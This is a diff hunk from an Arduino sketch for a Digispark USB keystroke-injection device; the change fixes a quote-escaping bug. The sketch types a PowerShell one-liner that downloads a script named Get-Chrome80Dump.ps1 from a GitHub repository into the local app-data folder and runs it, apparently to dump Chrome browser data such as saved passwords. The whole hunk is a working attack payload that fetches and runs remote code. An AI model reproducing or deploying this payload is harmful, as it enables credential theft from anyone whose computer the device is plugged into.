@@ -32,7 +32,7 @@ void setup() {
   DigiKeyboard.delay(2000);
 
   // Realize o download e execute o script .ps1
-  DigiKeyboard.print("(new-object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/DevDoreto/ChromeDuck80Payload/main/Chrome80DuckPayload.ino", \"$($env:LOCALAPPDATA)\\Get-Chrome80Dump.ps1\"); powershell \"$($env:LOCALAPPDATA)\\Get-Chrome80Dump.ps1\";");
+  DigiKeyboard.print("(new-object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/DevDoreto/ChromeDuck80Payload/main/Chrome80DuckPayload.ino\", \"$($env:LOCALAPPDATA)\\Get-Chrome80Dump.ps1\"); powershell \"$($env:LOCALAPPDATA)\\Get-Chrome80Dump.ps1\";");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 }
 
